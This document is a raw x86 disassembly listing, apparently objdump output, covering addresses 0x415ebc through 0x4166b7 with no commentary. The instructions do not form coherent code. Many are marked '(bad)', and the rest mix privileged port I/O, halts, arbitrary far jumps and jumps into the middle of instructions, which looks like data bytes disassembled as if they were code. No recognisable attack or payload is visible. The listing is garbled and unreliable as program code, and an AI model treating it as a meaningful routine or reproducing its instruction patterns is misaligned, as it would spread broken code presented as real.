  415ebc:	outs   dx,BYTE PTR ds:[esi]
  415ebd:	enter  0x8e0,0x6c
  415ec1:	add    esp,DWORD PTR [eax+0x72]
  415ec4:	pop    esi
  415ec5:	call   0x7180:0x8a78556a
  415ecc:	lds    edi,FWORD PTR [ecx-0x12]
  415ecf:	inc    esp
  415ed0:	std    
  415ed1:	add    cl,BYTE PTR [edx+0x53252bf]
  415ed7:	pop    eax
  415ed8:	dec    ecx
  415ed9:	jg     0x415f31
  415edb:	shr    DWORD PTR [edx],0x9f
  415ede:	sub    dl,dl
  415ee0:	mov    cl,cl
  415ee2:	lods   al,BYTE PTR ds:[esi]
  415ee3:	or     ebx,edi
  415ee5:	in     eax,dx
  415ee6:	sub    ecx,esp
  415ee8:	retf   
  415ee9:	add    eax,0x260d1d36
  415eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eef:	jae    0x415eee
  415ef1:	ficomp DWORD PTR [edi]
  415ef3:	jmp    0x415f29
  415ef5:	xor    eax,0x650e8375
  415efa:	adc    dl,bh
  415efc:	pop    ecx
  415efd:	hlt    
  415efe:	add    edx,DWORD PTR [eax+0x77002604]
  415f04:	mov    DWORD PTR [edi-0x28],edx
  415f07:	frstor [ebx+0x4ca5f52b]
  415f0d:	add    edx,DWORD PTR [ecx+ebx*4]
  415f10:	mov    ch,0x72
  415f12:	dec    esp
  415f13:	inc    ecx
  415f14:	xchg   edi,eax
  415f15:	sbb    DWORD PTR [edi],0x55
  415f18:	into   
  415f19:	lock cld 
  415f1b:	xlat   BYTE PTR ds:[ebx]
  415f1c:	retf   
  415f1d:	das    
  415f1e:	loopne 0x415eec
  415f20:	ins    BYTE PTR es:[edi],dx
  415f21:	add    dl,dl
  415f23:	and    BYTE PTR [ebx-0x40],0xee
  415f27:	push   esi
  415f28:	cmc    
  415f29:	loop   0x415fa7
  415f2b:	cmp    eax,0x15dcbc3d
  415f30:	retf   0x6fe8
  415f33:	mov    ds:0xd5ead204,eax
  415f38:	ret    
  415f39:	jle    0x415f15
  415f3b:	retf   0xa569
  415f3e:	jno    0x415ef2
  415f40:	mov    ah,0x17
  415f42:	jns    0x415f69
  415f44:	jl     0x415f48
  415f46:	cwde   
  415f47:	inc    ebp
  415f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f49:	pop    edx
  415f4a:	xor    al,0xca
  415f4c:	fadd   QWORD PTR [edx]
  415f4e:	xor    ah,BYTE PTR [edx-0x794f11f7]
  415f54:	or     eax,0x76ed1e6f
  415f59:	xchg   edi,eax
  415f5a:	sub    DWORD PTR [ebp-0x37],ebx
  415f5d:	imul   edx,DWORD PTR [edi+0x5d],0x311e46c5
  415f64:	div    DWORD PTR ds:0x8a20981d
  415f6a:	pop    ds
  415f6b:	jno    0x415efa
  415f6d:	push   0xffffffda
  415f6f:	sub    ebp,esi
  415f71:	ja     0x415f3c
  415f73:	aam    0xd4
  415f75:	scas   al,BYTE PTR es:[edi]
  415f76:	inc    ebx
  415f77:	pop    ebx
  415f78:	jmp    0xecff:0x8850d313
  415f7f:	int    0x5a
  415f81:	push   edx
  415f82:	xor    BYTE PTR [ecx+0x430802b0],bl
  415f88:	sbb    eax,0x42ca82c0
  415f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f8e:	pusha  
  415f8f:	xchg   edi,eax
  415f90:	sub    BYTE PTR [edi-0xd59c921],ah
  415f96:	(bad)
  415f99:	icebp  
  415f9a:	sbb    BYTE PTR [ebx],dl
  415f9c:	loop   0x415fa4
  415f9e:	je     0x415f65
  415fa0:	inc    esp
  415fa1:	imul   ebx,DWORD PTR [edi],0xe6ab3a3f
  415fa7:	mov    ch,0x38
  415fa9:	sub    dl,0xf1
  415fac:	mov    ebp,0x82be8024
  415fb1:	out    0x6d,eax
  415fb3:	xchg   DWORD PTR [eax-0x7d],ebx
  415fb6:	mov    DWORD PTR [eax-0x4a],eax
  415fb9:	std    
  415fba:	jge    0x415fa5
  415fbc:	cmp    eax,0x57d71da4
  415fc1:	cmp    esi,DWORD PTR [ebp-0x67fdd340]
  415fc7:	mov    esp,0xe79bf304
  415fcc:	inc    edx
  415fcd:	jmp    0x41601e
  415fcf:	lods   al,BYTE PTR ds:[esi]
  415fd0:	mov    BYTE PTR [edi-0x3222cd19],bh
  415fd6:	push   es
  415fd7:	ret    0xe005
  415fda:	sbb    bh,BYTE PTR [edi-0x2bec24b0]
  415fe0:	push   esi
  415fe1:	pop    ds
  415fe2:	outs   dx,DWORD PTR ds:[esi]
  415fe3:	push   ds
  415fe4:	aas    
  415fe5:	or     BYTE PTR [edi+ecx*1-0x7e],ah
  415fe9:	ins    DWORD PTR es:[edi],dx
  415fea:	(bad)  
  415feb:	jmp    0xd283b42
  415ff0:	int    0xc2
  415ff2:	inc    eax
  415ff3:	test   al,0x80
  415ff5:	add    bh,al
  415ff7:	lds    eax,FWORD PTR [ebp+0x46]
  415ffa:	cmp    ebx,0xffffffb3
  415ffd:	jl     0x41604a
  415fff:	cmp    DWORD PTR [ebx-0x77bf708e],edx
  416005:	mov    ebp,0xee6e5316
  41600a:	test   BYTE PTR [bx+si+0x4ec3],cl
  41600f:	xor    BYTE PTR [edi],0x62
  416012:	pop    esp
  416013:	dec    esi
  416014:	push   ecx
  416015:	add    al,BYTE PTR [edx+0x15]
  416018:	cmp    BYTE PTR [edi+0x10c878aa],al
  41601e:	pop    ds
  41601f:	dec    ebp
  416020:	xchg   eax,esi
  416022:	sub    DWORD PTR [ebx+0x4e],esi
  416025:	js     0x415fdf
  416027:	aad    0x7c
  416029:	mov    BYTE PTR [edx-0x25],bl
  41602c:	pop    esp
  41602d:	arpl   WORD PTR [edi+0x3c],di
  416030:	mov    DWORD PTR [ebx],edx
  416032:	pop    esp
  416033:	mov    bh,0xb
  416035:	out    0xb,al
  416037:	pop    ss
  416038:	sbb    DWORD PTR [edx],eax
  41603a:	mov    dl,0x87
  41603c:	pop    edx
  41603d:	icebp  
  41603e:	aam    0x14
  416040:	test   eax,0x88c56084
  416045:	jp     0x416080
  416047:	jmp    0x29c:0xec005c54
  41604e:	into   
  41604f:	cld    
  416050:	xor    al,bl
  416052:	xor    edx,DWORD PTR [edx-0x2d]
  416055:	push   ebx
  416056:	pop    ds
  416057:	fstp   QWORD PTR ds:0xeed501c4
  41605d:	(bad)  
  41605f:	aam    0xfb
  416061:	or     al,0xa1
  416063:	mov    eax,0x8d839c19
  416068:	mov    BYTE PTR [ecx+0x3b],al
  41606b:	fidiv  DWORD PTR [ecx+0x4e]
  41606e:	ins    BYTE PTR es:[edi],dx
  41606f:	jmp    0x41607b
  416071:	add    al,0x61
  416073:	aam    0x58
  416075:	repz push edi
  416077:	fld    DWORD PTR [edx-0x4]
  41607a:	sbb    DWORD PTR [esi],ebx
  41607c:	mov    DWORD PTR [ebp+0x7c],esi
  41607f:	sti    
  416080:	das    
  416081:	mov    ebx,0x118ce601
  416086:	js     0x416055
  416088:	cli    
  416089:	lock and eax,0x1830b6d7
  41608f:	xchg   edx,eax
  416090:	sahf   
  416091:	ja     0x4160b1
  416093:	pop    ebx
  416094:	lahf   
  416095:	xor    al,BYTE PTR [esp+eiz*2-0x32b46020]
  41609c:	or     al,BYTE PTR [esi]
  41609e:	std    
  41609f:	leave  
  4160a0:	jl     0x4160a4
  4160a2:	xor    BYTE PTR [esi+0x30],dh
  4160a5:	rcl    DWORD PTR [eax+0x1f074911],cl
  4160ab:	xchg   ebx,eax
  4160ac:	cmp    al,0x59
  4160ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160af:	and    edi,edx
  4160b1:	sbb    BYTE PTR [ecx],cl
  4160b3:	inc    esp
  4160b4:	inc    BYTE PTR ds:0x724a3194
  4160ba:	mov    ebp,0x1f24be51
  4160bf:	inc    ecx
  4160c0:	and    esi,edi
  4160c2:	mov    dl,bh
  4160c4:	stos   BYTE PTR es:[edi],al
  4160c5:	fdiv   QWORD PTR [esi]
  4160c7:	aam    0x94
  4160c9:	addr16 sti 
  4160cb:	(bad)  
  4160cc:	sub    eax,esp
  4160ce:	imul   edi,esi,0x76bd389
  4160d4:	cmp    eax,0xbcc3de42
  4160d9:	mov    ch,0xfd
  4160db:	cmp    DWORD PTR [eax-0x7324811b],ecx
  4160e1:	inc    ebx
  4160e2:	popf   
  4160e3:	jmp    0x71c9:0x3840b18a
  4160ea:	mov    edi,0xa751482a
  4160ef:	aam    0x86
  4160f1:	mov    DWORD PTR [edi],esi
  4160f3:	pop    esp
  4160f4:	aam    0xd5
  4160f6:	pop    eax
  4160f7:	cmp    al,0x68
  4160f9:	fldcw  WORD PTR [ebp-0x4b]
  4160fc:	sbb    BYTE PTR [edi+0x140978e6],cl
  416102:	push   ebp
  416103:	cli    
  416104:	fadd   DWORD PTR ds:0xdd420376
  41610a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41610b:	mov    cl,0x7f
  41610d:	int3   
  41610e:	pop    ds
  41610f:	sbb    DWORD PTR [edx-0x7cf263a5],ebx
  416115:	mov    ebx,0xf6a6254d
  41611a:	pusha  
  41611b:	xor    eax,0x1a347cbe
  416120:	fidiv  DWORD PTR [edx]
  416122:	ins    BYTE PTR es:[edi],dx
  416123:	cdq    
  416124:	shl    DWORD PTR [ecx],cl
  416126:	ficom  WORD PTR [ebx]
  416128:	sub    BYTE PTR [ebp+0x28318a2],bh
  41612e:	push   esp
  41612f:	push   0xb660800f
  416134:	add    ebx,ebp
  416136:	pop    ds
  416137:	mov    DWORD PTR [edx+0x41],ebp
  41613a:	ret    0xff0b
  41613d:	lds    ecx,FWORD PTR [esi-0x25]
  416140:	dec    edi
  416141:	dec    eax
  416142:	xchg   cl,al
  416144:	fadd   QWORD PTR ds:0x5b998f27
  41614a:	or     al,0xc6
  41614c:	pusha  
  41614d:	cmp    BYTE PTR [edi+edx*2+0x45638527],dl
  416154:	rol    BYTE PTR ds:0xaad86079,0xb
  41615b:	inc    eax
  41615c:	sbb    dh,BYTE PTR [edx]
  41615e:	push   0x1f633afc
  416163:	sbb    BYTE PTR [eax+0x2f],dl
  416166:	pop    ds
  416167:	push   edi
  416168:	jecxz  0x416187
  41616a:	mov    ds:0x5f6c4e25,al
  41616f:	lods   eax,DWORD PTR ds:[esi]
  416170:	test   eax,0xde9d1b2c
  416175:	add    eax,0x93f37df3
  41617a:	pop    ds
  41617b:	xor    eax,0x49a44678
  416180:	jbe    0x4161f5
  416182:	nop
  416183:	rcl    DWORD PTR [ebp+eiz*1+0x6a5b9f0e],1
  41618a:	fidiv  WORD PTR [ebp+0x271e4275]
  416190:	mov    esp,0x41ae344
  416195:	test   cl,bl
  416197:	shl    BYTE PTR [edx+eax*1-0x17de5086],0xff
  41619f:	fidivr WORD PTR [esi-0x3d]
  4161a2:	pusha  
  4161a3:	lahf   
  4161a4:	je     0x416141
  4161a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a7:	into   
  4161a8:	mov    ds:0x8f9a1345,al
  4161ad:	inc    esi
  4161ae:	mov    ds,WORD PTR ds:0x1069826f
  4161b4:	fs mov ebx,0x33892f03
  4161ba:	mov    ebx,0xd2809b46
  4161bf:	mov    ah,0x79
  4161c1:	add    dl,BYTE PTR [ebx+eax*8-0x141eb8b2]
  4161c8:	fnsave [ecx]
  4161ca:	push   ds
  4161cb:	das    
  4161cc:	mov    eax,0x3224b8b8
  4161d1:	clc    
  4161d2:	hlt    
  4161d3:	aad    0x3a
  4161d5:	(bad)
  4161d9:	aas    
  4161da:	in     al,0x9d
  4161dc:	mov    BYTE PTR ds:0x3fce4969,ah
  4161e2:	arpl   si,bx
  4161e4:	or     al,0x2
  4161e6:	push   ss
  4161e7:	loop   0x41617a
  4161e9:	test   DWORD PTR [eax+0x60d7fc1a],esi
  4161ef:	mov    ebx,0xa2ec7ee8
  4161f4:	mov    eax,0xa4ba4dec
  4161f9:	jg     0x41625f
  4161fb:	ins    DWORD PTR es:[edi],dx
  4161fc:	dec    ecx
  4161fd:	xchg   ecx,eax
  4161fe:	inc    esi
  4161ff:	jle    0x4161de
  416201:	pop    edx
  416202:	push   ds
  416203:	sbb    eax,0xdbef505c
  416208:	loop   0x416251
  41620a:	push   esi
  41620b:	call   0x4e49:0x7573785f
  416212:	jl     0x416278
  416214:	mov    cl,cl
  416216:	jmp    0x977e:0xbddd7310
  41621d:	add    eax,0xa5f2334a
  416222:	jp     0x416275
  416224:	adc    DWORD PTR [ebx+0x58],ebx
  416227:	pop    es
  416228:	push   eax
  416229:	mov    ch,0x8f
  41622b:	aad    0x2d
  41622d:	stos   BYTE PTR es:[edi],al
  41622e:	das    
  41622f:	loopne 0x41626a
  416231:	jnp    0x4161f0
  416233:	fild   DWORD PTR [ecx+0x19394b8d]
  416239:	je     0x416259
  41623b:	int    0xb
  41623d:	das    
  41623e:	sub    DWORD PTR [esi+0x5b],esi
  416241:	addr16 jnp 0x4161cd
  416244:	adc    DWORD PTR [edx-0x461f6b0a],eax
  41624a:	jg     0x416282
  41624c:	cld    
  41624d:	clc    
  41624e:	in     eax,dx
  41624f:	stos   BYTE PTR es:[edi],al
  416250:	push   ebx
  416251:	sbb    al,0xab
  416253:	mov    ebp,0xcd45e29d
  416258:	dec    ebx
  416259:	lea    eax,[edx]
  41625b:	push   edx
  41625c:	call   0x5302:0x65e2833b
  416263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416264:	enter  0x6ceb,0xd5
  416268:	aad    0x6e
  41626a:	jnp    0x416201
  41626c:	test   bh,0x5
  41626f:	sub    DWORD PTR [ecx+0x99d373],ecx
  416275:	scas   eax,DWORD PTR es:[edi]
  416276:	push   ss
  416277:	(bad)
  41627a:	mov    ds:0x98ecfdbb,al
  41627f:	ror    BYTE PTR [eax+0x5f14006],1
  416285:	jno    0x416283
  416287:	push   ecx
  416288:	mov    BYTE PTR [edi],bh
  41628a:	aaa    
  41628b:	rcr    BYTE PTR [ecx+ecx*1],0x70
  41628f:	test   eax,0x81be1499
  416294:	cmp    DWORD PTR [ebx],ebx
  416296:	loope  0x4162e2
  416298:	arpl   WORD PTR es:[ecx+0x47],dx
  41629c:	push   cs
  41629d:	pop    eax
  41629e:	inc    edx
  41629f:	add    DWORD PTR [edi+eiz*1+0x771b11e],ebx
  4162a6:	sbb    eax,0x9e03e1cc
  4162ab:	pop    ebx
  4162ac:	adc    al,0xef
  4162ae:	adc    eax,0x60d27ecd
  4162b3:	inc    esp
  4162b4:	push   0x229f1feb
  4162b9:	icebp  
  4162ba:	jp     0x4162c7
  4162bc:	fadd   DWORD PTR [edi-0x33372a24]
  4162c2:	mov    ah,0x12
  4162c4:	push   edi
  4162c5:	push   esp
  4162c6:	sti    
  4162c7:	aas    
  4162c8:	xor    DWORD PTR [eax],edx
  4162ca:	cld    
  4162cb:	inc    esp
  4162cc:	jns    0x4162d0
  4162ce:	sar    cl,cl
  4162d0:	clc    
  4162d1:	mov    al,ds:0x2505d6f3
  4162d6:	mov    esp,cs
  4162d8:	popf   
  4162d9:	in     eax,0x9f
  4162db:	adc    ebp,0x8994a9c2
  4162e1:	or     eax,0x9bb6b33d
  4162e6:	push   eax
  4162e7:	push   eax
  4162e8:	add    BYTE PTR [eax],0x1e
  4162eb:	inc    eax
  4162ec:	mov    ah,0x4f
  4162ee:	lods   al,BYTE PTR ds:[esi]
  4162ef:	dec    ecx
  4162f0:	retf   0xcef5
  4162f3:	popf   
  4162f4:	xchg   DWORD PTR [edi+0x19],edx
  4162f7:	mov    ebp,0x90ffa2bf
  4162fc:	shl    BYTE PTR [eax+0x2e],0xe4
  416300:	add    eax,0x880f9673
  416305:	sbb    eax,0xb5e2b45e
  41630a:	bound  ecx,QWORD PTR [ebx+0x44]
  41630d:	popf   
  41630e:	pop    ds
  41630f:	inc    ebp
  416310:	data16 mov al,ds:0x3bfc2ad2
  416316:	and    DWORD PTR [ebp+0x103125c4],ebp
  41631c:	xor    BYTE PTR [eax+ebx*8+0x54],0x23
  416321:	test   dl,al
  416323:	jle    0x4162ae
  416325:	dec    ebx
  416326:	jns    0x416319
  416328:	fisttp QWORD PTR fs:[edi+0x46]
  41632c:	push   edx
  41632d:	xor    al,0x22
  41632f:	(bad)  
  416330:	adc    al,BYTE PTR [edx]
  416332:	lods   al,BYTE PTR ds:[esi]
  416333:	(bad)  
  416334:	(bad)  
  416335:	clc    
  416336:	test   eax,0xdf9b8973
  41633b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41633c:	aam    0x90
  41633e:	mov    BYTE PTR [ecx],dh
  416340:	pop    DWORD PTR [eax]
  416342:	inc    edx
  416343:	push   0x868fb6b3
  416348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416349:	lods   eax,DWORD PTR ds:[esi]
  41634a:	jp     0x41633e
  41634c:	mov    dl,BYTE PTR [edi-0xb8ad02c]
  416352:	jbe    0x4163a2
  416354:	dec    eax
  416355:	mov    edx,0x5c4ed49
  41635a:	outs   dx,BYTE PTR ds:[esi]
  41635b:	jg     0x4163ab
  41635d:	mov    DWORD PTR [ecx],ecx
  41635f:	jmp    0xbfbd:0xa56ebde5
  416366:	loop   0x416345
  416368:	ja     0x4163ac
  41636a:	jge    0x41631e
  41636c:	adc    dh,bh
  41636e:	xchg   ebp,eax
  41636f:	aad    0x28
  416371:	pop    ebx
  416372:	mov    ah,0x67
  416374:	mov    ds:0x89d06667,eax
  416379:	test   DWORD PTR [ebp+0x70],esp
  41637c:	pop    eax
  41637d:	data16 or al,0x75
  416380:	std    
  416381:	add    eax,0x74fb5050
  416386:	xlat   BYTE PTR ds:[ebx]
  416387:	add    BYTE PTR [ecx-0xd],ch
  41638a:	pop    ds
  41638b:	popa   
  41638c:	jl     0x416375
  41638e:	in     al,dx
  41638f:	loopne 0x41632c
  416391:	sub    BYTE PTR [eax+0x173e0346],dh
  416397:	fs push cs
  416399:	and    BYTE PTR [edx-0x5fdcc38],dh
  41639f:	aaa    
  4163a0:	mov    dl,0x75
  4163a2:	aam    0xef
  4163a4:	cmc    
  4163a5:	xlat   BYTE PTR ds:[ebx]
  4163a6:	push   0x29
  4163a8:	mov    bh,BYTE PTR [ecx-0x2d]
  4163ab:	jo     0x4163bb
  4163ad:	in     eax,0x8d
  4163af:	and    eax,0xdaf25a5d
  4163b4:	loopne 0x4163bb
  4163b6:	mov    esp,0xc8c558e1
  4163bb:	jne    0x4163a7
  4163bd:	push   0xc0e2091e
  4163c2:	ja     0x4163f2
  4163c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c5:	idiv   BYTE PTR [ebx]
  4163c7:	xlat   BYTE PTR ds:[ebx]
  4163c8:	mov    dh,0x25
  4163ca:	ror    BYTE PTR [ebp-0x2175d45d],1
  4163d0:	mov    DWORD PTR ds:0xd4fcc2f3,eax
  4163d6:	stc    
  4163d7:	mov    al,0x28
  4163d9:	jmp    0xfd93:0x3798d0ae
  4163e0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163e2:	fisttp WORD PTR [esi-0x5d]
  4163e5:	int    0x1f
  4163e7:	xchg   DWORD PTR [ebx],edi
  4163e9:	mov    dh,BYTE PTR [ebp-0x4d02d1fb]
  4163ef:	fwait
  4163f0:	test   BYTE PTR [ecx+0x11],bh
  4163f3:	push   edi
  4163f4:	or     bl,BYTE PTR [eax]
  4163f6:	ds in  al,0x13
  4163f9:	push   ebx
  4163fa:	pop    ds
  4163fb:	ja     0x4163d0
  4163fd:	cmp    cl,dl
  4163ff:	fwait
  416400:	adc    DWORD PTR [ecx],edi
  416402:	pop    ebx
  416403:	mov    ch,0x78
  416405:	loop   0x416398
  416407:	(bad)  
  416408:	cmp    edx,DWORD PTR [edi-0x100b379d]
  41640e:	out    0xdd,al
  416410:	pop    ss
  416411:	mov    esp,0xaa2b5d60
  416416:	in     eax,dx
  416417:	repnz adc ah,BYTE PTR ds:0x1745aa67
  41641e:	pop    es
  41641f:	rcl    ch,1
  416421:	mov    ds:0xa0cc8ef3,al
  416426:	outs   dx,BYTE PTR ds:[esi]
  416427:	xlat   BYTE PTR ds:[ebx]
  416428:	int3   
  416429:	pandn  mm3,QWORD PTR [ecx+ebp*8]
  41642d:	push   esi
  41642e:	jno    0x4163db
  416430:	loopne 0x4163bd
  416432:	pusha  
  416433:	push   0x0
  416435:	sbb    edi,DWORD PTR [ecx-0x5bda76fb]
  41643b:	retf   0xfb04
  41643e:	pusha  
  41643f:	data16 adc BYTE PTR [eax],al
  416442:	enter  0xec3e,0xb4
  416446:	xor    al,0x9e
  416448:	sbb    ch,BYTE PTR [edx-0x6877164c]
  41644e:	popa   
  41644f:	inc    esi
  416450:	adc    DWORD PTR [bx+si],eax
  416453:	add    cl,BYTE PTR [ebx+0x3]
  416456:	adc    al,ch
  416458:	push   esi
  416459:	cwde   
  41645a:	std    
  41645b:	out    dx,al
  41645c:	pusha  
  41645d:	imul   ebx,DWORD PTR [edi],0xb6b118db
  416463:	jbe    0x416473
  416465:	(bad)  
  416466:	push   ecx
  416467:	aad    0xe2
  416469:	adc    al,0x64
  41646b:	sbb    DWORD PTR [eax+eax*2],ecx
  41646e:	pop    ds
  41646f:	pusha  
  416470:	mov    bh,ch
  416472:	mov    al,ds:0x948e5869
  416477:	or     DWORD PTR [edx],edi
  416479:	(bad)  
  41647a:	cmp    DWORD PTR [edx],ebx
  41647c:	mov    BYTE PTR [ebp+0x3d],al
  41647f:	ins    BYTE PTR es:[edi],dx
  416480:	xlat   BYTE PTR ds:[ebx]
  416481:	fcmovb st,st(5)
  416483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416484:	sub    DWORD PTR [edx-0x5e763110],esp
  41648a:	or     ebx,eax
  41648c:	(bad)  [edi+ebp*2]
  41648f:	fdiv   QWORD PTR [eax+0x3f246002]
  416495:	es ss push ecx
  416498:	push   0x8bc76695
  41649d:	sub    eax,DWORD PTR [eiz*1-0x543b3d70]
  4164a4:	out    dx,eax
  4164a5:	add    eax,0x484c8c8a
  4164aa:	es test eax,0xa51f7e93
  4164b0:	push   edx
  4164b1:	sbb    BYTE PTR [ebp+0x1b173b15],cl
  4164b7:	aad    0xd2
  4164b9:	add    eax,0x223c29ec
  4164be:	sub    edi,DWORD PTR [eax+0x6e]
  4164c1:	repnz popa 
  4164c3:	loope  0x416482
  4164c5:	(bad)  
  4164c6:	aad    0xce
  4164c8:	inc    ecx
  4164c9:	clc    
  4164ca:	loopne 0x416467
  4164cc:	shr    BYTE PTR [edx-0x2f],0xd5
  4164d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d1:	mov    ch,0x1e
  4164d3:	sub    eax,0x457afa19
  4164d8:	mov    DWORD PTR [ebx-0x5c],eax
  4164db:	mov    ds:0xbbbeed52,al
  4164e0:	repz add eax,DWORD PTR [edi+edx*2+0x43b5b8c1]
  4164e8:	retf   0x25c2
  4164eb:	dec    eax
  4164ec:	mov    ss,WORD PTR [ebx+0x68279190]
  4164f2:	outs   dx,BYTE PTR ds:[esi]
  4164f3:	aad    0x4
  4164f5:	leave  
  4164f6:	dec    eax
  4164f7:	aam    0x94
  4164f9:	push   ss
  4164fa:	jbe    0x4164fe
  4164fc:	(bad)  
  4164fd:	(bad)  
  4164fe:	int    0x62
  416500:	mov    BYTE PTR ds:0x9743112e,ah
  416506:	fcmovne st,st(5)
  416508:	into   
  416509:	(bad)  
  41650a:	pop    ss
  41650b:	lods   eax,DWORD PTR ds:[esi]
  41650c:	pop    edx
  41650d:	neg    ecx
  41650f:	ror    esi,1
  416511:	pop    ecx
  416512:	out    dx,eax
  416513:	or     al,0x39
  416515:	push   esp
  416516:	push   ds
  416517:	sub    DWORD PTR [eax+0x76],eax
  41651a:	push   esp
  41651b:	repz fs jge 0x4164fc
  41651f:	popf   
  416520:	push   ds
  416521:	inc    edi
  416522:	hlt    
  416523:	aad    0x9d
  416525:	jecxz  0x4164fe
  416527:	ret    
  416528:	lahf   
  416529:	sbb    BYTE PTR [edi],bl
  41652b:	dec    ebp
  41652c:	aaa    
  41652d:	std    
  41652e:	and    DWORD PTR [ebx-0x2a4bd02a],ebx
  416534:	push   ss
  416535:	hlt    
  416536:	sub    BYTE PTR [ebx-0x3e635b4a],cl
  41653c:	mov    BYTE PTR [edi-0x395603e7],bh
  416542:	hlt    
  416543:	mov    dh,0x1a
  416545:	adc    al,0xb6
  416547:	vpsubb ymm1,ymm3,YMMWORD PTR [edi-0x1309674b]
  41654f:	pushf  
  416550:	mov    cl,ah
  416552:	xchg   DWORD PTR [ecx],ecx
  416554:	jge    0x41656b
  416556:	xor    ebp,ebp
  416558:	cli    
  416559:	add    eax,0x87e4a37e
  41655e:	por    mm2,QWORD PTR [edi+0x4d971f2b]
  416565:	inc    ebp
  416566:	stos   DWORD PTR es:[edi],eax
  416567:	dec    esp
  416568:	call   0xbffb:0xc5d5bb6d
  41656f:	pop    esp
  416570:	clc    
  416571:	popa   
  416572:	mov    WORD PTR [ebx+0x389a5b89],?
  416578:	add    eax,DWORD PTR [ecx-0x3d]
  41657b:	sbb    al,BYTE PTR [ebx]
  41657d:	add    ah,BYTE PTR [edx+0xb]
  416580:	and    DWORD PTR [esi],edi
  416582:	adc    DWORD PTR [ebx-0x47],eax
  416585:	into   
  416586:	pop    ds
  416587:	fsubr  st(3),st
  41658a:	pop    ss
  41658b:	pop    esi
  41658c:	faddp  st(7),st
  41658e:	inc    eax
  41658f:	ror    DWORD PTR [edi-0x4b],cl
  416592:	repnz dec esi
  416594:	js     0x416542
  416596:	xor    cl,bh
  416598:	add    DWORD PTR [edx+0x4b],ebx
  41659b:	or     eax,0x591e3bd2
  4165a0:	mov    cl,BYTE PTR [ebx]
  4165a2:	test   BYTE PTR [edi],ch
  4165a4:	js     0x41652b
  4165a6:	(bad)
  4165aa:	jnp    0x41652d
  4165ac:	pop    ss
  4165ad:	test   eax,0xb48caadf
  4165b2:	not    DWORD PTR [esi-0x78]
  4165b5:	mov    ebx,0x23ea9a8d
  4165ba:	outs   dx,BYTE PTR ds:[esi]
  4165bb:	rcl    DWORD PTR [bx],cl
  4165be:	fs jmp 0xcb8a:0xf5e51b7b
  4165c6:	jg     0x4165ca
  4165c8:	mov    BYTE PTR [ebp+0x25c3310a],ah
  4165ce:	sub    bh,cl
  4165d0:	and    eax,0x8803918a
  4165d5:	mov    ebx,0x29336dd1
  4165da:	into   
  4165db:	shl    BYTE PTR [ebp+eax*1+0x60],cl
  4165df:	xor    DWORD PTR [esi-0x78],esi
  4165e2:	and    al,0x5b
  4165e4:	rcl    dh,cl
  4165e6:	mov    esp,eax
  4165e8:	push   edx
  4165e9:	loop   0x4165d7
  4165eb:	aad    0x74
  4165ed:	push   esi
  4165ee:	ficomp WORD PTR [ecx]
  4165f0:	xchg   BYTE PTR [ecx],ah
  4165f2:	lods   al,BYTE PTR ds:[esi]
  4165f3:	inc    esi
  4165f4:	mov    BYTE PTR [ecx+0xe33f16c],dh
  4165fa:	xchg   ecx,eax
  4165fb:	and    esi,DWORD PTR [ecx+0x2]
  4165fe:	loop   0x416656
  416600:	cdq    
  416601:	(bad)  
  416602:	pop    ss
  416603:	popf   
  416604:	int3   
  416605:	fidivr WORD PTR [edi+0x64d78b72]
  41660b:	jmp    0x41668b
  41660d:	xor    bh,dh
  41660f:	push   edi
  416610:	jmp    0x7205:0xee85370d
  416617:	je     0x41664e
  416619:	test   BYTE PTR [edi+0x102f8d3d],0x24
  416620:	mov    BYTE PTR ds:0xa1ce7d80,dh
  416626:	retf   
  416627:	xchg   ecx,eax
  416628:	cmp    BYTE PTR [edx],al
  41662a:	dec    esi
  41662b:	(bad)  
  41662c:	jbe    0x416604
  41662e:	ja     0x4165d1
  416630:	push   edi
  416631:	push   ss
  416632:	pusha  
  416633:	mov    cl,0x84
  416635:	cld    
  416636:	xrelease mov BYTE PTR cs:[edx-0x32],dl
  41663b:	push   eax
  41663c:	mov    bl,0x1f
  41663e:	stos   BYTE PTR es:[edi],al
  41663f:	jnp    0x41668e
  416641:	jmp    0xa748:0x7b396d56
  416648:	xchg   ebp,eax
  416649:	jnp    0x4165fe
  41664b:	sahf   
  41664c:	mov    es,WORD PTR [edx]
  41664e:	mov    ds:0x2aad8541,eax
  416653:	aas    
  416654:	aaa    
  416655:	jo     0x416675
  416657:	fnstenv [edx]
  416659:	in     eax,0x8e
  41665b:	mov    DWORD PTR [ebx+edx*8],ebx
  41665e:	add    BYTE PTR [ebx],0x4
  416661:	not    DWORD PTR [eax+0x32]
  416664:	int3   
  416665:	add    eax,0x8cc409ae
  41666a:	enter  0xfbec,0x14
  41666e:	push   ds
  41666f:	or     esi,DWORD PTR [esi+0x4de8981]
  416675:	das    
  416676:	mov    ah,0xd5
  416678:	mov    ch,BYTE PTR [esp+ebx*4]
  41667b:	or     edx,DWORD PTR [ecx-0x5b]
  41667e:	xchg   DWORD PTR [esi],ebx
  416680:	mov    BYTE PTR [ebp+0x42],bl
  416683:	adc    cl,bl
  416685:	mov    bh,bh
  416687:	and    bl,dl
  416689:	add    eax,0xeef6ff38
  41668e:	fsub   QWORD PTR [esi-0x72]
  416691:	or     edi,DWORD PTR [ebx+eiz*1-0x37]
  416695:	cmp    al,BYTE PTR [ecx+0x14]
  416698:	mov    bl,0x6f
  41669a:	xor    eax,0x14021fe8
  41669f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a0:	sbb    cl,BYTE PTR [ebp+0x117a5820]
  4166a6:	xor    DWORD PTR ds:[eax-0x460e4ef5],ecx
  4166ad:	mov    bl,0x2f
  4166af:	cmp    bl,BYTE PTR [ecx-0x2343cfab]
  4166b5:	lock inc ecx
  4166b7:	popf   
